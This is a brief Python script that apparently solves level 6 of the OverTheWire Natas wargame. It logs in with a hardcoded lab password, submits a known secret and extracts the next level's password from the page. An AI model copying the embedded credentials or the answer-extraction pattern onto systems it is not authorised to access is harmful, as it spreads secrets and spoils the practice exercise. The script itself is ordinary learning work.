import requests
import re

url = "http://natas6.natas.labs.overthewire.org/"
user = "natas6"
password = "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"

data = {"secret":"FOEIUWGHFEEUHOFUOIU", "submit":"submit"}

r = requests.post(url, auth=(user, password), data=data)

result = re.findall(r"The password for natas7 is (.*)", r.text)[0]

print(f"Natas7:{result}")
